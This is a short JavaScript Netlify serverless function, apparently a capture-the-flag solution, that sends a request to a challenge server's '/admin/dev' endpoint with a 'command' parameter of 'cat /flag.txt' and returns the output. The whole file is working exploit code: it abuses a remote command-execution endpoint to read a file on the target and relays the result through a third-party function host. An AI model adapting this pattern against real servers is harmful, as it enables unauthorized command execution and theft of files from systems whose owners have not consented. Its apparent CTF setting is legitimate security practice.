exports.handler = async function(event, context) {
  const command = 'cat%20/flag.txt';
  const url = `http://0.cloud.chals.io:1337/admin/dev?command=${command}`;

  try {
      const {default: fetch} = await import('node-fetch');
      const response = await fetch(url);
      const data = await response.text();

      console.log("Fetched data:", data); // This will log to Netlify Function logs

      return {
          statusCode: 200,
          body: data
      };
  } catch (error) {
      console.error("Error fetching data:", error); // This will also log to Netlify Function logs
      return {
          statusCode: 500,
          body: `Server error: ${error.message}`
      };
  }
};
